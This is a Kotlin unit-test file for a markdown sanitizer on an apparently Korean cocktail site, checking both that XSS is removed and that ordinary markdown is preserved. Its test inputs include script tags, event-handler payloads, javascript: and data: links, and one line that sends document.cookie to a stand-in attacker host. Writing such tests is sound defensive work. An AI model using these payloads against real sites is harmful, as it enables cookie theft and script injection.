package kr.kcocktail.common.security.sanitize

import org.assertj.core.api.Assertions.assertThat
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.assertAll

/**
 * ISSUE-007 RED 20~25 — 저장 시점 정화 (SPEC-08 §7).
 *
 * ## 과잉 제거가 과소 제거만큼 나쁘다
 *
 * 에디터가 쓴 마크다운이 저장 후 달라져 있으면 다시 쓰지 않게 된다.
 * 위험 패턴을 지우는 테스트와 **정상 문법이 남는** 테스트가 짝이다.
 */
class MarkdownSanitizerTest {

    @Test
    fun `RED21 - script 태그가 제거된다`() {
        assertAll(
            listOf(
                "<script>alert(1)</script>",
                "<SCRIPT>alert(1)</SCRIPT>",
                "<script src=\"http://evil.example/x.js\"></script>",
                "<script\ntype=\"text/javascript\">alert(1)</script>",
            ).map<String, () -> Unit> { payload ->
                {
                    val clean = MarkdownSanitizer.sanitize("진토닉은 상쾌하다. $payload")
                    assertThat(clean)
                        .`as`("%s", payload)
                        .doesNotContainIgnoringCase("script")
                        .doesNotContain("alert(1)")
                        .contains("진토닉은 상쾌하다.")
                }
            },
        )
    }

    /** 여는 태그만 지우면 `alert(1)` 이 본문으로 남는다. 블록째 지워야 한다. */
    @Test
    fun `script 내용이 본문으로 새지 않는다`() {
        assertThat(MarkdownSanitizer.sanitize("<script>document.cookie</script>"))
            .doesNotContain("document.cookie")
            .isEmpty()
    }

    @Test
    fun `RED22 - 이벤트 핸들러 속성이 제거된다`() {
        assertAll(
            listOf(
                """<img src=x onerror="alert(1)">""",
                """<div onclick="steal()">클릭</div>""",
                """<body onload=alert(1)>""",
                """<svg onload=alert(1)>""",
            ).map<String, () -> Unit> { payload ->
                {
                    assertThat(MarkdownSanitizer.sanitize(payload))
                        .`as`("%s", payload)
                        .doesNotContainIgnoringCase("onerror")
                        .doesNotContainIgnoringCase("onclick")
                        .doesNotContainIgnoringCase("onload")
                }
            },
        )
    }

    /**
     * 마크다운 링크 문법은 태그가 아니라 파서가 만든다.
     * 태그를 다 지워도 `[텍스트](javascript:...)` 는 남으므로 따로 본다.
     */
    @Test
    fun `RED23 - javascript 프로토콜 링크가 제거된다`() {
        assertAll(
            listOf(
                "[클릭](javascript:alert(1))",
                "[클릭](JavaScript:alert(1))",
                "[클릭]( javascript:alert(1) )",
                "[클릭](data:text/html;base64,PHNjcmlwdD4=)",
                "[클릭](vbscript:msgbox)",
            ).map<String, () -> Unit> { payload ->
                {
                    val clean = MarkdownSanitizer.sanitize(payload)
                    assertThat(clean)
                        .`as`("%s", payload)
                        .doesNotContainIgnoringCase("javascript:")
                        .doesNotContainIgnoringCase("vbscript:")
                        .doesNotContainIgnoringCase("data:")
                    assertThat(clean).`as`("링크 텍스트는 남는다").contains("[클릭]")
                }
            },
        )
    }

    /** 과잉 제거 방지. 에디터가 쓴 것이 그대로 남아야 다시 쓴다. */
    @Test
    fun `RED24 - 마크다운 정상 문법은 보존된다`() {
        val source = """
            ## 진토닉

            **상쾌한** 하이볼이다. *가장* 흔하지만 가장 어렵다.

            - 진 45ml
            - 토닉워터 120ml

            > 얼음을 가득 채운다.

            [ADR-0002](https://example.kr/adr/0002) · [상세](/cocktails/gin-tonic)

            `stir` 로 가볍게 저어 준다.

            1. 잔을 미리 차갑게
            2. 진을 붓는다
        """.trimIndent()

        val clean = MarkdownSanitizer.sanitize(source)

        assertThat(clean)
            .contains("## 진토닉")
            .contains("**상쾌한**")
            .contains("*가장*")
            .contains("- 진 45ml")
            .contains("> 얼음을 가득 채운다.")
            .contains("[ADR-0002](https://example.kr/adr/0002)")
            .contains("[상세](/cocktails/gin-tonic)")
            .contains("`stir`")
            .contains("1. 잔을 미리 차갑게")
    }

    /**
     * RED 25 — **저장된 값 자체가 안전하다.**
     *
     * 렌더링 시점에만 처리하면 출력 경로마다 놓친다 — SSG 빌드 · 어드민 미리보기 ·
     * OG 태그 생성 · 검색 색인. 경로는 이슈가 늘수록 늘어나고,
     * 새 경로를 만드는 사람은 정화가 필요하다는 것을 모른다.
     */
    @Test
    fun `RED25 - 정화 결과에 실행 가능한 것이 남지 않는다`() {
        val hostile = """
            # 제목
            <script>fetch('//evil.example?c='+document.cookie)</script>
            <img src=x onerror="alert(document.domain)">
            [탈취](javascript:void(fetch('//evil.example')))
            <iframe src="//evil.example"></iframe>
            <style>body{display:none}</style>
            정상 본문은 남는다.
        """.trimIndent()

        val clean = MarkdownSanitizer.sanitize(hostile)

        assertAll(
            listOf("<script", "</script", "onerror", "javascript:", "<iframe", "<style", "document.cookie")
                .map<String, () -> Unit> { danger ->
                    { assertThat(clean).`as`("%s 가 남았다", danger).doesNotContainIgnoringCase(danger) }
                },
        )
        assertThat(clean).contains("# 제목", "정상 본문은 남는다.")
    }

    /** 여러 번 돌려도 결과가 같아야 한다 — 저장·수정·재저장이 반복된다. */
    @Test
    fun `멱등이다`() {
        val once = MarkdownSanitizer.sanitize("<script>x</script>## 제목\n[a](javascript:b)")
        assertThat(MarkdownSanitizer.sanitize(once)).isEqualTo(once)
    }

    @Test
    fun `빈 문자열과 공백을 다룬다`() {
        assertThat(MarkdownSanitizer.sanitize("")).isEmpty()
        assertThat(MarkdownSanitizer.sanitize("   \n  ")).isEmpty()
    }
}
